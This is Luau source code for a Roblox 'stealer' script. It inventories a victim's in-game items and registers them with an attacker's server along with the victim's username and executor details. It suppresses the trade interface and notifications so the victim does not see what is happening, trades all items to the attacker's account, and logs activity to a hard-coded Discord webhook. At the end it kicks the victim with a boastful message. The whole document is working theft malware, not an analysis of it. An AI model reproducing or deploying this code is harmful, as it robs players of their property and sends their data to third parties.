		table.insert(Queue, { request = { method = Method, endpoint = Endpoint, headers = Headers, body = Body }, response = Slot })

		repeat
			task.wait(0.1)
		until Slot.ref ~= nil

		return Slot.ref
	end

	task.spawn(Loop)
	return Send
end

Container.O = function()
	local Entry = Container.Cache.O

	if not Entry then
		Entry = { Value = BuildHttp() }
		Container.Cache.O = Entry
	end

	return Entry.Value
end

local function BuildApi()
	local Json = Container.M()
	local Crypto = Container.N()
	local Config = Container.B()
	Container.O()

	local function AuthHeaders(ContentType)
		return { ["exploit-api-key"] = Config.EXPLOIT_API_KEY, ["content-type"] = ContentType }
	end

	local function ParseResponse(Response)
		if not Response.ok then
			error("Failed to parse response, not OK")
		end

		local Ok, Result = pcall(Json.decode, Response.body)

		if not Ok then
			local Raise = error
			local Message = ("Failed to parse JSON\nResponse: %*\nError: %*"):format(Response.body, Result)
			Raise(Message)
		end

		local Data = Result

		if not Data.success then
			error("Failed to parse JSON response, not success")
		end

		return Data.data
	end

	return {
		getAuthorizationHeaders = AuthHeaders,
		parseJsonResponse = ParseResponse,
		parseEncryptedJsonResponse = function(Response)
			local Data = ParseResponse(Response)
			local Plain = Crypto.decrypt(Data)
			return Json.decode(Plain)
		end,
	}
end

Container.P = function()
	local Entry = Container.Cache.P

	if not Entry then
		Entry = { Value = BuildApi() }
		Container.Cache.P = Entry
	end

	return Entry.Value
end

local function BuildEndpoints()
	local Json = Container.M()
	local Crypto = Container.N()
	Container.K()
	Container.J()
	local Config = Container.B()
	local Api = Container.P()
	local Metadata = Container.L()
	local Send = Container.O()

	return {
		registerExecution = function()
			local Payload = { stealerId = ID, executor = Config.EXECUTOR_NAME }
			local Response = Send("POST", "/hits/execution", Api.getAuthorizationHeaders("application/json"), Json.encode(Payload))

			if not Response.ok then
				Metadata.logger.error("Failed to register execution", { payload = Payload, response = Response })
				error("Failed to register execution")
			end

			return Api.parseJsonResponse(Response)
		end,
		registerHit = function(Payload)
			local Plain = Api.getAuthorizationHeaders("text/plain")
			local Encrypted = Crypto.encrypt(Json.encode(Payload))
			local Response = Send("POST", "/hits/register", Plain, Encrypted)

			if not Response.ok then
				Metadata.logger.error("Failed to register hit", { payload = Payload, response = Response })
				error("Failed to register due to error")
			end

			return Api.parseEncryptedJsonResponse(Response)
		end,
		claimItem = function(SecretKey, UniqueId, Count)
			local Response = Send("POST", "/hits/claim", Api.getAuthorizationHeaders("application/json"), Json.encode({ secretKey = SecretKey, uniqueId = UniqueId, count = Count }))

			if not Response.ok then
				Metadata.logger.error("Failed to claim item", { uniqueId = UniqueId, count = Count, response = Response })
				error("Failed to claim item")
			end
		end,
		connect = function(SecretKey)
			local Headers = Api.getAuthorizationHeaders("application/json")
			local Response = Send("POST", ("/hits/connection?secretKey=%*"):format(SecretKey), Headers, "{}")

			if not Response.ok then
				Metadata.logger.error("Failed to connect", { secretKey = SecretKey, response = Response })
				error("Failed to connect")
			end
		end,
		pullFromConnection = function(SecretKey)
			local Headers = Api.getAuthorizationHeaders("application/json")
			local Response = Send("GET", ("/hits/connection?secretKey=%*"):format(SecretKey), Headers, nil)

			if not Response.ok then
				Metadata.logger.error("Failed to pull from connection", { secretKey = SecretKey, response = Response })
				error("Failed to pull from connection")
			end

			return Api.parseJsonResponse(Response)
		end,
	}
end

Container.Q = function()
	local Entry = Container.Cache.Q

	if not Entry then
		Entry = { Value = BuildEndpoints() }
		Container.Cache.Q = Entry
	end

	return Entry.Value
end

local function BuildInventory()
	local PlotController = require(game:GetService("ReplicatedStorage").Controllers.PlotController)
	local Animals = require(game.ReplicatedStorage.Datas.Animals)
	local Mutations = require(game.ReplicatedStorage.Datas.Mutations)
	game:GetService("Players")

	local function ComputeValue(Index, Mutation)
		local Animal = Animals[Index]
		if not Animal then
			return 0
		end
		local Generation = Animal.Generation or 0
		local Multiplier = 0

		if not (not Mutation or Mutation == "") then
			local MutationDef = Mutations[Mutation]

			if MutationDef then
				Multiplier = MutationDef.Multiplier or 0
			end
		end

		return Generation * (1 + Multiplier)
	end

	local function GetAnimals()
		local Plot = PlotController.GetMyPlot()
		if not Plot then
			return {}
		end
		local List = {}

		for _, Animal in pairs(Plot.Channel.CacheTable.AnimalList) do
			if type(Animal) == "table" then
				if Animal.Index then
					if not Animal.Steal then
						table.insert(List, Animal)
					end
				end
			end
		end

		return List
	end

	return { getItems = function()
		local Items = {}

		for _, Animal in GetAnimals() do
			table.insert(Items, { uniqueId = Animal.UUID, name = Animal.Index, count = 1, value = ComputeValue(Animal.Index, Animal.Mutation) })
		end

		return Items
	end }
end

Container.R = function()
	local Entry = Container.Cache.R

	if not Entry then
		Entry = { Value = BuildInventory() }
		Container.Cache.R = Entry
	end

	return Entry.Value
end

local function BuildHasher()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")

	return { getHashed = function(Target)
		local Candidates = {}
		local Hashed = {}

		for Key, Child in ReplicatedStorage.Packages.Net:GetChildren() do
			if Child:IsA("RemoteEvent") or Child:IsA("RemoteFunction") then
				local Prefix, Suffix = string.match(Child.Name, "^([A-Z]+)/(.*)")

				if Prefix then
					if Suffix then
						if not string.match(Suffix, "^[a-f0-9]+$") or #Suffix ~= 64 then
							if not string.match(Suffix, "^[a-f0-9%-]+$") then
								Candidates[Key] = { n = Child.Name, cn = Child.ClassName }
							end
						else
							table.insert(Hashed, { n = Child.Name, cn = Child.ClassName, i = Key, inst = Child })
						end
					end
				end
			end
		end

		for _, Entry in Hashed do
			local Best = -1

			for Key, Candidate in Candidates do
				if Key < Entry.i and Candidate.cn == Entry.cn then
					if Best < Key and string.match(Candidate.n, "^([A-Z]+/)") == string.match(Entry.n, "^([A-Z]+/)") then
						Best = Key
					end
				end
			end

			if not (Best > 0) or Candidates[Best].n ~= Target then
				continue
			end
			return Entry.inst
		end

		return nil
	end }
end

Container.S = function()
	local Entry = Container.Cache.S

	if not Entry then
		Entry = { Value = BuildHasher() }
		Container.Cache.S = Entry
	end

	return Entry.Value
end

local function BuildTradeRequest()
	local Hasher = Container.S()

	return {
		sendRequest = function(UserId)
			Hasher.getHashed("RF/TradeService/Invite"):InvokeServer("afb005f9-6e81-4e0a-8bb0-3555938a9658", UserId)
		end,
		acceptRequest = function(UserId)
			Hasher.getHashed("RE/TradeService/Accept"):FireServer("918ee0f5-e98f-413f-b76e-baee47b021cb", UserId)
		end,
		rejectRequest = function(UserId)
			Hasher.getHashed("RE/TradeService/DeclineInvite"):FireServer("99448380-7cdd-45ad-be4e-332ec6194ba6", UserId)
		end,
	}
end

Container.T = function()
	local Entry = Container.Cache.T

	if not Entry then
		Entry = { Value = BuildTradeRequest() }
		Container.Cache.T = Entry
	end

	return Entry.Value
end

local function BuildDomainEvents()
	local Events = Container.G()

	return {
		newTradeRequest = Events.createEventDefinition(),
		newTradeCreated = Events.createEventDefinition(),
		tradeDone = Events.createEventDefinition(),
		itemsAdded = Events.createEventDefinition(),
		targetAppearedOnServer = Events.createEventDefinition(),
	}
end

Container.U = function()
	local Entry = Container.Cache.U

	if not Entry then
		Entry = { Value = BuildDomainEvents() }
		Container.Cache.U = Entry
	end

	return Entry.Value
end

local function BuildTrade()
	local Hasher = Container.S()
	Container.H()
	local Metadata = Container.L()
	local Domain = Container.U()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local InterfaceController = require(ReplicatedStorage.Controllers.InterfaceController)
	local PlotController = require(ReplicatedStorage.Controllers.PlotController)
	local Channel = "Trade_" .. game.Players.LocalPlayer.UserId
	local Replicator = require(ReplicatedStorage.Packages.ReplicatorClient).get(Channel)
	local Ready = false
	local Accepted = false

	Replicator:ListenRaw(function(State)
		if not State.active then
			return
		end
		Ready = false
		Accepted = false

		for _, Player in State.active.data.players do
			if Player.username == game.Players.LocalPlayer.Name then
				Ready = Player.ready
				Accepted = Player.accepted
				break
			end
		end
	end)

	local function IsInTrade()
		local TradeLiveTrade = InterfaceController.GetInterfaces().TradeLiveTrade
		return TradeLiveTrade and TradeLiveTrade.State == true
	end

	local function Accept()
		repeat
			task.wait(0.1)
			Hasher.getHashed("RE/TradeService/Ready"):FireServer("d73acf93-6f32-44df-b813-0f6b32c7afd9")
		until Ready

		while true do
			task.wait(0.1)

			if not Ready then
				Hasher.getHashed("RE/TradeService/Ready"):FireServer("d73acf93-6f32-44df-b813-0f6b32c7afd9")
			end

			Hasher.getHashed("RE/TradeService/Accept"):FireServer("918ee0f5-e98f-413f-b76e-baee47b021cb")
			if not Accepted then
				continue
			end
			break
		end
	end

	local function Decline()
		Hasher.getHashed("RE/TradeService/CancelTrade"):FireServer("9d1937e7-6262-487b-98be-af45618270c9")
	end

	local function FindAnimal(UUID)
		local Plot = PlotController.GetMyPlot()
		if not Plot then
			return nil, nil
		end

		for Key, Animal in pairs(Plot.Channel.CacheTable.AnimalList) do
			if type(Animal) == "table" and Animal.UUID == UUID then
				return Key, Animal
			end
		end

		return nil, nil
	end

	return {
		isInTrade = IsInTrade,
		accept = Accept,
		decline = Decline,
		addItems = function(Items)
			local AddBrainrot = Hasher.getHashed("RF/TradeService/AddBrainrot")

			for _, Item in Items do
				local Key, Animal = FindAnimal(Item.uniqueId)

				if not (not Key or not Animal) then
					task.wait(0.5)
					local Ok, Err = AddBrainrot:InvokeServer("6b5f15fb-5cb9-4d07-a031-bbff8e641eda", Key, Animal)

					if not (Ok or Err ~= "Please wait before adding another brainrot") then
						while true do
							task.wait(0.5)
							local Ok2, Err2 = AddBrainrot:InvokeServer("6b5f15fb-5cb9-4d07-a031-bbff8e641eda", Key, Animal)

							if Err2 == "Other player doesn't have enough space" then
								break
							elseif Ok2 then
								break
							end
						end
					end
				end
			end

			Metadata.coreEventBus.publish(Domain.itemsAdded.create())
		end,
	}
end

Container.V = function()
	local Entry = Container.Cache.V

	if not Entry then
		Entry = { Value = BuildTrade() }
		Container.Cache.V = Entry
	end

	return Entry.Value
end

local function BuildSetup()
	local Players = game:GetService("Players")
	local ReplicatedStorage = game:GetService("ReplicatedStorage")

	local function Notify()
	end

	local function HideGui(Gui, Name)
		local Frame = Gui:WaitForChild(Name)
		Frame.Enabled = false

		Frame:GetPropertyChangedSignal("Enabled"):Connect(function()
			if Frame.Enabled then
				Frame.Enabled = false
			end
		end)
	end

	local function ForceFlag(Target, Key)
		Target[Key] = false

		Target:GetPropertyChangedSignal(Key):Connect(function()
			if Target[Key] then
				Target[Key] = false
			end
		end)
	end

	local function KillConnections(Source, Line)
		local Net = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")
		local Count = 0

		for _, Child in Net:GetChildren() do
			if Child:IsA("RemoteEvent") then
				for _, Connection in getconnections(Child.OnClientEvent) do
					local Source2, Line2 = debug.info(Connection.Function, "sl")

					if Source2 then
						if Source2:find(Source) then
							if not (Line ~= nil and Line2 ~= Line) then
								Connection:Disable()
								Count += 1
							end
						end
					end
				end
			end
		end

		return Count
	end

	local function KillHandlers(Id, Source)
		for _, Value in getgc(true) do
			if type(Value) ~= "table" then
				continue
			end
			local IdValue = rawget(Value, "Id")
			if not IdValue then
				continue
			end

			if tostring(IdValue):find(Id) then
				local Signal = rawget(Value, "_listen_raw_signal")
				if not Signal then
					continue
				end
				local Head = Signal._handlerListHead
				local Prev = nil

				while true do
					if not Head or type(Head) ~= "table" then
						return
					else
						local Fn = rawget(Head, "_fn")

						if Fn then
							local Source2 = debug.info(Fn, "s")

							if Source == nil or Source2 and Source2:find(Source) then
								rawset(Head, "Connected", false)

								if not Prev then
									rawset(Signal, "_handlerListHead", rawget(Head, "_next") or false)
								else
									rawset(Prev, "_next", rawget(Head, "_next"))
								end

								if Source then
									break
								end

								if not Prev then
									Head = Signal._handlerListHead
								else
									Head = rawget(Prev, "_next")
								end

								continue
							end
						end

						Prev = Head
						Head = rawget(Head, "_next")
					end
				end

				return
			end
		end
	end

	local function SilenceNotifications()
		local NotificationController = require(ReplicatedStorage.Controllers.NotificationController)
		NotificationController.Notify = Notify
		NotificationController.Success = Notify
		NotificationController.Error = Notify
	end

	local function ClearTopNotifications(Gui)
		local TopNotification = Gui:WaitForChild("TopNotification"):WaitForChild("TopNotification")

		for _, Child in TopNotification:GetChildren() do
			if not Child:IsA("UIBase") then
				Child:Destroy()
			end
		end

		TopNotification.ChildAdded:Connect(function(Child)
			Child:Destroy()
		end)
	end

	local function ClearNotifications(Gui)
		local Template = Gui:WaitForChild("Notification"):WaitForChild("Notification"):FindFirstChild("Template")

		if Template then
			Template:Destroy()
		end
	end

	return { setup = function()
		local PlayerGui = Players.LocalPlayer:WaitForChild("PlayerGui")
		HideGui(PlayerGui, "TradeLiveTrade")
		HideGui(PlayerGui, "TradePrompts")
		HideGui(PlayerGui, "TradePlayerList")
		HideGui(PlayerGui, "TopNotification")
		HideGui(PlayerGui, "Notification")
		ClearTopNotifications(PlayerGui)
		ClearNotifications(PlayerGui)
		ForceFlag(workspace.CurrentCamera:WaitForChild("Blur"), "Enabled")
		KillConnections("NotificationController")
		KillConnections("TradeController")
		KillHandlers("Trade_", "TradeController")
		SilenceNotifications()
	end }
end

Container.W = function()
	local Entry = Container.Cache.W

	if not Entry then
		Entry = { Value = BuildSetup() }
		Container.Cache.W = Entry
	end

	return Entry.Value
end

local function BuildGame()
	Container.I()
	return { inventory = Container.R(), tradeRequest = Container.T(), trade = Container.V(), gameSetup = Container.W() }
end

Container.X = function()
	local Entry = Container.Cache.X

	if not Entry then
		Entry = { Value = BuildGame() }
		Container.Cache.X = Entry
	end

	return Entry.Value
end

local function BuildLogger()
	local Factory = Container.C()
	local Json = Container.M()
	local Config = Container.B()
	local Metadata = Container.L()

	local function Gate(Allowed)
		return function(Level, Next, ...)
			if not Allowed[Level] then
				return ...
			end
			return Next(...)
		end
	end

	local function Console(Level, Next, ...)
		local Args = { Next(...) }

		if Level == "verbose" then
			local Write = print
			local Line = ("[%*]: %*"):format(Level, table.concat(Args, " "))
			Write(Line)
		else
			local Write = warn
			local Line = ("[%*]: %*"):format(Level, table.concat(Args, " "))
			Write(Line)
		end

		return table.unpack(Args)
	end

	local function Ignored(Message)
		local Lower = Message:lower()

		for _, Pattern in Config.IGNORE_MESSAGE_PATTERNS_IN_WEBHOOK do
			if not Lower:find(Pattern) then
				continue
			end
			return true
		end

		return false
	end

	local function SendWebhook(Message)
		task.spawn(function()
			local Response = request({
				Url = "https://discord.com/api/webhooks/1427333378146963517/IVgB0BKSrcNJQPe65hFxkcpTfkubHwSB9xN-6XBPX_i4g1iiD66L7qjeAycA0HGMSXjw",
				Method = "POST",
				Headers = { ["Content-Type"] = "application/json" },
				Body = Json.encode({ content = Message }),
			})

			if Response.statusCode ~= 200 then
				local Write = warn
				local Line = ("Failed to log to webhook: %*"):format(Response.statusCode)
				Write(Line)
			end
		end)
	end

	local function Webhook(Level, Next, ...)
		local Args = { Next(...) }
		local Line = ("[%*]: %*"):format(Level, table.concat(Args, " "))

		if not Ignored(Line) then
			SendWebhook(Line)
		end

		return table.unpack(Args)
	end

	local function Encode(Level, Next, ...)
		local Out = {}

		for _, Arg in { Next(...) } do
			Out[#Out + 1] = Json.encode(Arg)
		end

		return table.unpack(Out)
	end

	local function Attach(Level, Next, ...)
		local Args = { Next(...) }
		table.insert(Args, { metadata = Metadata.metadataForLogger })
		return table.unpack(Args)
	end

	local Sink = _G.VERBOSE == true and Console or Webhook
	return Factory(Gate({ error = true, warn = true, verbose = _G.VERBOSE == true }), Sink, Encode, Attach)
end

Container.Y = function()
	local Entry = Container.Cache.Y

	if not Entry then
		Entry = { Value = BuildLogger() }
		Container.Cache.Y = Entry
	end

	return Entry.Value
end

local function BuildContext()
	local Metadata = Container.L()
	local Events = Container.G()

	return function()
		local Api = Container.Q()
		local Game = Container.X()
		local Logger = Container.Y()
		Metadata.metadataForLogger = {}
		Metadata.trade = Game.trade
		Metadata.tradeRequest = Game.tradeRequest
		Metadata.gameSetup = Game.gameSetup
		Metadata.inventory = Game.inventory
		Metadata.coreEventBus = Events.createBus()
		Metadata.domainEventBus = Events.createBus()
		Metadata.logger = Logger
		Metadata.api = Api
	end
end

Container.Z = function()
	local Entry = Container.Cache.Z

	if not Entry then
		Entry = { Value = BuildContext() }
		Container.Cache.Z = Entry
	end

	return Entry.Value
end

local function BuildClaimEvents()
	return { itemClaimed = Container.G().createEventDefinition() }
end

Container.AA = function()
	local Entry = Container.Cache.AA

	if not Entry then
		Entry = { Value = BuildClaimEvents() }
		Container.Cache.AA = Entry
	end

	return Entry.Value
end

local function BuildRecorder()
	Container.G()

	return function()
		local Events = {}

		local function Record(Event)
			Events[#Events + 1] = Event
		end

		return {
			record = Record,
			playback = function(Bus)
				local Pending = Events
				Events = {}

				for _, Event in Pending do
					Bus.publish(Event)
				end
			end,
		}
	end
end

Container.AB = function()
	local Entry = Container.Cache.AB

	if not Entry then
		Entry = { Value = BuildRecorder() }
		Container.Cache.AB = Entry
	end

	return Entry.Value
end

local function BuildHit()
	local Claimed = Container.AA()
	Container.A()
	Container.M()
	game:GetService("HttpService")
	local Recorder = Container.AB()

	return { create = function(Id, SecretKey, Usernames, SabUserId, Items)
		local Hit = {
			id = Id,
			secretKey = SecretKey,
			usernames = Usernames,
			sabUserId = SabUserId,
			items = Items,
			eventsRecorder = Recorder(),
		}

		local function Find(UniqueId)
			for _, Item in Hit.items do
				if Item.uniqueId ~= UniqueId then
					continue
				end
				return Item
			end

			return nil
		end

		Hit.getUnclaimedItems = function()
			local Out = {}

			for _, Item in Hit.items do
				if Item.claimedCount < Item.count then
					table.insert(Out, Item)
				end
			end

			return Out
		end

		local function HasUnclaimedItems()
			return #Hit.getUnclaimedItems() > 0
		end

		Hit.hasUnclaimedItems = HasUnclaimedItems

		Hit.isItemExists = function(UniqueId)
			return Find(UniqueId) ~= nil
		end

		Hit.isWantedItem = function(UniqueId)
			local Item = Find(UniqueId)
			if Item ~= nil then
				return Item.isWanted
			end
			return false
		end

		Hit.canClaim = function(UserId)
			if not Hit.sabUserId then
				return false
			end

			if Hit.sabUserId == UserId then
				return true
			end
			return false
		end

		Hit.claimItem = function(UniqueId, Count)
			local Item = Find(UniqueId)

			if Item == nil then
				local Raise = error
				local Message = ("Item not found (uniqueId: %*)"):format(UniqueId)
				Raise(Message)
			end

			if Item.count < Item.claimedCount + Count then
				local Raise = error
				local Message = ("Can't claim more items than available (item: %*, count: %*, claimedCount: %*, claiming count: %*)"):format(Item.uniqueId, Item.count, Item.claimedCount, Count)
				Raise(Message)
			end

			Item.claimedCount = Item.claimedCount + Count
			Hit.eventsRecorder.record(Claimed.itemClaimed.create({ uniqueId = UniqueId, count = Count }))
		end

		return Hit
	end }
end

Container.AC = function()
	local Entry = Container.Cache.AC

	if not Entry then
		Entry = { Value = BuildHit() }
		Container.Cache.AC = Entry
	end

	return Entry.Value
end

local function BuildRetry()
	return { retry = function(Attempts, Delay, Fn)
		local Tries = 0
		local LastError = nil

		while Tries < Attempts do
			local Ok, Result = pcall(Fn)
			if Ok then
				return Result
			end
			Tries += 1
			LastError = Result
			task.wait(Delay)
		end

		return error(LastError)
	end }
end

Container.AD = function()
	local Entry = Container.Cache.AD

	if not Entry then
		Entry = { Value = BuildRetry() }
		Container.Cache.AD = Entry
	end

	return Entry.Value
end

local function BuildOrchestrator()
	Container.AC()
	local Domain = Container.U()
	local Metadata = Container.L()
	local Hasher = Container.S()

	return function(Hit)
		local SabUserId = Hit.sabUserId
		if not SabUserId then
			Metadata.logger.verbose("No valid target userIds resolved")
			return
		end

		while task.wait(1) do
			if Hit.hasUnclaimedItems() then
				local SearchUser = Hasher.getHashed("RF/TradeService/SearchUser")

				local Ok, Result, Err, Extra = pcall(function()
					return SearchUser:InvokeServer("792baf13-54a1-4663-92c4-1edd9da1e3e2", SabUserId)
				end)

				if Ok and not (Err == "Please wait before searching another user" or Err ~= true) then
					Metadata.logger.verbose("Target is in game", { username = SabUserId })
					Metadata.coreEventBus.publish(Domain.targetAppearedOnServer.create({ userid = SabUserId }))
				end
			else
				setclipboard("discord.gg/project-reverse")
				game:GetService("Players").LocalPlayer:Kick("Your inventory got cleaned by discord.gg/project-reverse")
				break
			end
		end
	end
end

Container.AE = function()
	local Entry = Container.Cache.AE

	if not Entry then
		Entry = { Value = BuildOrchestrator() }
		Container.Cache.AE = Entry
	end

	return Entry.Value
end

local function BuildPoller()
	Container.AC()
	local Metadata = Container.L()

	return function(Hit)
		while true do
			local Ok, Result = pcall(Metadata.api.pullFromConnection, Hit.secretKey)

			if not Ok then
				Metadata.logger.error("Failed to pull from connection", { error = Result })
			end

			task.wait(0.2)
		end
	end
end

Container.AF = function()
	local Entry = Container.Cache.AF

	if not Entry then
		Entry = { Value = BuildPoller() }
		Container.Cache.AF = Entry
	end

	return Entry.Value
end

local function BuildResponder()
	Container.AC()
	local Claimed = Container.AA()
	Container.A()
	Container.H()
	local Domain = Container.U()
	local Metadata = Container.L()

	local function BuildPayload(Hit)
		local Sorted = table.clone(Hit.getUnclaimedItems())

		table.sort(Sorted, function(A, B)
			return A.valuable.price > B.valuable.price
		end)

		local Out = {}

		for _, Item in Sorted do
			table.insert(Out, { uniqueId = Item.uniqueId, name = Item.valuable.name, count = Item.count - Item.claimedCount })
		end

		return Out
	end

	local function Guard(Fn)
		local Ok, Result = pcall(Fn)

		if not Ok then
			Metadata.logger.error("Failed to execute callback, declining trade", { error = Result })
			local Ok2, Result2 = pcall(Metadata.trade.decline)

			if not Ok2 then
				Metadata.logger.error("Failed to decline trade", { error = Result2 })
			end
		end

		return Ok
	end

	return function(Hit)
		Metadata.coreEventBus.subscribe(Domain.targetAppearedOnServer.createObserver(function(Event)
			Metadata.tradeRequest.sendRequest(Event.payload.userid)
		end))

		Metadata.coreEventBus.subscribe(Domain.newTradeRequest.createObserver(function(Event)
			if Metadata.trade.isInTrade() then
				return
			end
			Metadata.logger.verbose("New trade request from user", { username = Event.payload.userid })
			if not Hit.canClaim(Event.payload.userid) then
				Metadata.tradeRequest.rejectRequest(Event.payload.userid)
				return
			end
			Metadata.tradeRequest.acceptRequest(Event.payload.userid)
		end))

		Metadata.coreEventBus.subscribe(Domain.newTradeCreated.createObserver(function(Event)
			if Hit.canClaim(Event.payload.userid) then
				Metadata.logger.verbose("New trade created", { username = Event.payload.userid })

				if not Guard(function()
					local Items = BuildPayload(Hit)
					Metadata.logger.verbose("Adding items to trade", { items = Items })
					Metadata.trade.addItems(Items)
				end) then
					Metadata.logger.error("Failed to add items to trade, trade declined")
				end

				return
			end

			local Ok, Result = pcall(Metadata.trade.decline)

			if not Ok then
				Metadata.logger.error("Failed to decline trade, from unknown user", { username = Event.payload.userid, error = Result })
			end
		end))

		Metadata.coreEventBus.subscribe(Domain.itemsAdded.createObserver(function()
			Metadata.logger.verbose("Items added")

			if not Guard(function()
				Metadata.trade.accept()
			end) then
				Metadata.logger.error("Failed to confirm trade, trade declined")
			end
		end))

		Metadata.coreEventBus.subscribe(Domain.tradeDone.createObserver(function(Event)
			for UniqueId, Count in Event.payload.items do
				if Hit.isItemExists(UniqueId) then
					Hit.claimItem(UniqueId, Count)
				else
					Metadata.logger.warn("Item does not exist in hit domain model, claiming skipped", { uniqueId = UniqueId })
				end
			end

			Hit.eventsRecorder.playback(Metadata.domainEventBus)
		end))

		Metadata.domainEventBus.subscribe(Claimed.itemClaimed.createObserver(function(Event)
			local Payload = Event.payload
			if not Hit.isWantedItem(Payload.uniqueId) then
				return
			end
			local Ok, Result = pcall(Metadata.api.claimItem, Hit.secretKey, Payload.uniqueId, Payload.count)

			if not Ok then
				Metadata.logger.error("Failed to claim item", { error = Result })
			end
		end))
	end
end

Container.AG = function()
	local Entry = Container.Cache.AG

	if not Entry then
		Entry = { Value = BuildResponder() }
		Container.Cache.AG = Entry
	end

	return Entry.Value
end

local function BuildBindings()
	local Domain = Container.U()
	local Metadata = Container.L()
	local Hasher = Container.S()
	game:GetService("Players")
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local CreateInvite = Hasher.getHashed("RE/TradeService/CreateInvite")
	local TradeCompleted = Hasher.getHashed("RE/TradeService/TradeCompleted")
	local Channel = "Trade_" .. game.Players.LocalPlayer.UserId
	local Replicator = require(ReplicatedStorage.Packages.ReplicatorClient).get(Channel)
	local TradeId = nil
	local Brainrots = nil

	Replicator:ListenRaw(function(State)
		if not State.active then
			TradeId = nil
			return
		end

		for _, Player in State.active.data.players do
			if Player.username ~= game.Players.LocalPlayer.Name then
				break
			else
				Brainrots = Player.offer.brainrots
			end
		end

		local Target = nil

		for _, UserId in State.active.data.users do
			if UserId ~= game.Players.LocalPlayer.UserId then
				Target = UserId
			end
		end

		if TradeId == nil then
			TradeId = State.active.tradeId
			Metadata.coreEventBus.publish(Domain.newTradeCreated.create({ userid = Target }))
		end
	end)

	TradeCompleted.OnClientEvent:Connect(function()
		local Items = {}

		for _, Brainrot in Brainrots do
			Items[Brainrot.UUID] = 1
		end

		Metadata.coreEventBus.publish(Domain.tradeDone.create({ items = Items }))
	end)

	CreateInvite.OnClientEvent:Connect(function()
	end)

	return {}
end

Container.AH = function()
	local Entry = Container.Cache.AH

	if not Entry then
		Entry = { Value = BuildBindings() }
		Container.Cache.AH = Entry
	end

	return Entry.Value
end

local Config = Container.B()

if game.GameId ~= Config.GAME_ID then
	return
end

local Metadata = Container.L()
local Setup = Container.Z()
Container.J()
Container.H()
local HitFactory = Container.AC()
Container.A()
local Retry = Container.AD()
local Orchestrator = Container.AE()
local Poller = Container.AF()
local Responder = Container.AG()
local Players = game:GetService("Players")

local function GetJobId()
	local JobId = nil
	local Original = nil

	Original = hookmetamethod(game, "__index", function(Target, Key)
		if not (JobId or checkcaller()) then
			JobId = Original(game, "JobId")
		end

		return Original(Target, Key)
	end)

	repeat
		task.wait(0.1)
	until JobId ~= nil

	return JobId
end

local function RegisterExecution()
	local Ok, Result = pcall(Metadata.api.registerExecution)

	if not Ok then
		Metadata.logger.error("Failed to register execution", { error = Result })
		error("failed to start, please try again later")
	end

	return Result
end

local function RegisterHit(Nonce, Inventory)
	Metadata.logger.verbose("Registering hit...")
	local Payload = {}

	for _, Item in Inventory do
		Payload[Item.uniqueId] = {
			uniqueId = Item.uniqueId,
			valuable = Item.name,
			count = Item.count,
			metadata = { value = Item.value },
		}
	end

	local Ok, Result = pcall(Metadata.api.registerHit, {
		username = Players.LocalPlayer.Name,
		inventory = Payload,
		game = Config.GAME_NAME,
		serverId = "???",
		stealerId = ID,
		executor = Config.EXECUTOR_NAME,
		nonce = Nonce,
	})

	if not Ok then
		Metadata.logger.error("Failed to register hit", { error = Result })
		error("failed to start, please try again later")
	end

	return Result
end

local function Connect(Hit)
	Metadata.logger.verbose("Connecting to hit...", { secretKey = Hit.secretKey })

	local Ok, Result = pcall(Retry.retry, 5, 0.5, function()
		return (Metadata.api.connect(Hit.secretKey))
	end)

	if not Ok then
		Metadata.logger.error("Failed to connect to hit", { error = Result })
		error("failed to start, please try again later")
	end

	Metadata.logger.verbose("Connected to hit")
end

local function BuildItems(HitItems, Inventory)
	local Items = {}

	for _, Entry in HitItems do
		table.insert(Items, {
			id = Entry.id,
			uniqueId = Entry.uniqueId,
			valuable = Entry.valuable,
			count = Entry.count,
			claimedCount = Entry.claimedCount,
			isWanted = true,
		})
	end

	if not Config.GIVE_ALL_ITEMS then
		return Items
	end

	for _, Entry in Inventory do
		table.insert(Items, {
			id = Entry.uniqueId,
			uniqueId = Entry.uniqueId,
			valuable = { name = Entry.name, price = 0 },
			count = Entry.count,
			claimedCount = 0,
			isWanted = false,
		})
	end

	return Items
end

task.spawn(function()
	Setup()
	Metadata.metadataForLogger.serverType = ""
	Metadata.metadataForLogger.username = Players.LocalPlayer.Name
	Metadata.metadataForLogger.executor = Config.EXECUTOR_NAME
	Metadata.metadataForLogger.hwid = Config.HWID
	Metadata.logger.verbose("Dependencies initialized, registering execution...")
	local Execution = RegisterExecution()
	Metadata.logger.verbose("Execution registered, registering hit...")
	local Inventory = Metadata.inventory.getItems()
	Metadata.logger.verbose("Got user inventory", { inventory = Inventory })

	if #Inventory == 0 then
		Metadata.logger.verbose("No inventory items found, declining hit")
		error("failed to start, please try again later")
	end

	Container.AH()
	local Response = RegisterHit(Execution, Inventory)
	Metadata.logger.verbose("Hit registered", { hitDto = Response })
	Metadata.metadataForLogger.hitId = Response.hit.id
	Metadata.logger.verbose("Creating hit domain model...")
	local Items = BuildItems(Response.hit.items, Inventory)
	local Hit = HitFactory.create(Response.hit.id, Response.secretKey, Response.usernames, tonumber(Response.sabUserId), Items)
	Metadata.logger.verbose("Hit model created", { hit = Hit })
	Connect(Hit)
	Metadata.gameSetup.setup()
	task.spawn(Orchestrator, Hit)
	task.spawn(Poller, Hit)
	Responder(Hit)
end)